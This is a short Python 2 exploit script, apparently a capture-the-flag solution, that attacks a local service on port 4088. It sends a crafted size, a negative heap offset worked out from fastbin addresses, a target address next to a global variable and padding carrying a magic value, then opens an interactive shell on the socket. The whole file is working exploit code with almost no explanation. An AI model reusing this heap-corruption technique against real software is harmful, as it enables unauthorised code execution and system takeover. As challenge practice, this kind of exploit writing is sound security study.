import socket, struct, telnetlib
import time


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def p(a): return struct.pack("<I",a)
def ps(a): return struct.pack("<i", a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


s, f = sock("127.0.0.1", 4088)


# size
size = 0x7f
f.write(str(size).ljust(8, '\0'))

time.sleep(0.5)

offset = -0x30
#        first_malloc     fastbins
offset = 0x7ffff00008c0 - (0x7ffff0000028 + 0x8 * 5)
offset = -offset
f.write(ps(offset))

addr_size = 0x6020e0
addr_target = addr_size - 0x8
f.write(p(addr_target))

magic = 0xc0c0aff6
for _ in xrange((size / 8) - 1):
    f.write(p(0))
    f.write(p(magic))

f.write(p(0))
# malloc size
f.write(str(0x68) + '\n')

pad = 'A' * (0x8 * 4)
f.write(pad)



shell(s)
